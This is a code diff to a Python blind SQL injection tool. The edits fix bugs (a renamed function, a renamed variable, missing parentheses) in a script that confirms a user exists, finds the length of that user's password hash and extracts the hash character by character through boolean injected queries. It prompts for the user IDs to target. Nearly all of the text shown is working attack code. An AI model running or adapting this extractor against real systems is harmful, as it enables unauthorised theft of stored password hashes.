@@ -29,7 +29,7 @@ def boolean_query(offset, user_id, character, operator=">"):
 #is the user valid? 
 def invalid_user(user_id):
   payload = "(select id from user where id = {}) >= 0".format(user_id) 
-  return injected_payload(payload) 
+  return injected_query(payload) 
 
 #length of user password hash 
 #incrementing over how long the hash is
@@ -47,11 +47,11 @@ def password_len(user_id):
 
 #if user is valid and password hash is present, let's extract the hash
 #iterating through characters in password_length to find the true character
-def extract_hash(charset, user_id, password_len):
+def extract_hash(charset, user_id, password_length):
   found = ""
-  for i in range(0, password_len):
+  for i in range(0, password_length):
     for j in range(len(charset)):
-      if boolean_query(i, user_id, charset[j])):
+      if boolean_query(i, user_id, charset[j]):
         found += charset[j]
         break
   return found 
@@ -65,8 +65,6 @@ def total_queries_taken():
   #once printed reset the var
   total_queries = 0 
 
-
-
 while True:
   try:
     user_id = input("> Enter a User ID to extract a password hash:  ")
@@ -75,13 +73,6 @@ while True:
       print("\t[-] User {} hash length: {}".format(user_id, user_password_len))
       total_queries_taken()
     else:
-      print("\t\t [X] User {} does not exist".format(user_id) 
+      print("\t\t [X] User {} does not exist".format(user_id)) 
   except KeyboardInterrupt: 
     break 
-            
-      
-
-
-  
-
-  
